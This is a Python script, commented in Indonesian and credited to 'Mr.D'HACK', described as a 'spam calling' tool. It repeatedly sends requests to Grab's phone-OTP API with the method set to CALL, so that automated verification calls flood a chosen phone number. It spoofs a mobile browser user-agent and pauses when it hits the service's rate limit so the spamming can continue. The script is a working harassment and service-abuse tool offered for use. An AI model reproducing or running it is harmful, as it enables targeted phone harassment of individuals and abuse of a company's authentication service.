#!/usr/bin/python
#code By: Mr.D'HACK
#code Date: 22/12/2019
#Tools spam calling
###################################
#            Color                #
###################################
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
###################################
#         Kesalahan Module        #
###################################
try:
	import os, requests, time, json
except ModuleNotFoundError:
	print ("\nSepertinya module requests BELUM Di Install")
###################################
#            banner               #
###################################
banner = """
            ___
          </>|<\>
           \___/
        { Code By }
       } Mr.D'HACK {
       <<<<<\_/>>>>>
"""
###################################
#        input target             #
###################################
print (banner)
target = input("[+] Notarget: ")
jlmh=int(input("[+] Jumlah Spam: "))
###################################
#           
try:
	henti_tanya=False
	forcecon=0
	print("\n%s[-] RESULT:%s"%(r,w));time.sleep(1)
	for i in range(jlmh):
		cout=1
		print(f"{'{'}{i+1}{'}'}"+"="*40+f"{'{'}{i+1}{'}'}")
		for i in target:
			if i == '':
				cout+=1
				continue
			dt={'method':'CALL','countryCode':'id','phoneNumber':i,'templateID':'pax_android_production'}
			r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt,headers={'user-agent':'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6264; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36'})

			if "10074" in r1.text:
				print(f"[!] Sepertinya Target Terkena Batas limit Spam , Tunggu 15 mnt untuk melanjutkan")
				if henti_tanya == True:
					pass
				else:
					pil=input("[?] Kesalahan! Apa anda ingin menjeda sepama 1 mnt? [y/n] ")
					if pil.lower() == 'y':
						for x in range(60):
							try:
								print(end=f"\r[!] Jeda {60-(x+1)} detik",flush=True)
								time.sleep(1)
							except: break
						print("\n[+] Melanjutkan....")
					elif pil.lower() == 'f':
						henti_tanya=True
					else:
						forcecon+=1
						if forcecon >= 3:
							print(f"[!] {c}tekan F untuk menghentikan pertanyaan{w}")
			elif "challengeID" in r1.text:
				print ("[+] Spam Berhasil.")
			else:
				print (f"[-] Spam Gagal.")
			time.sleep(10)
			cout+=1 
	print("{end}"+"="*40+"{end}")
except KeyboardInterrupt:
	print("\n%sBye2......."%(c))                                                                                                                                                      
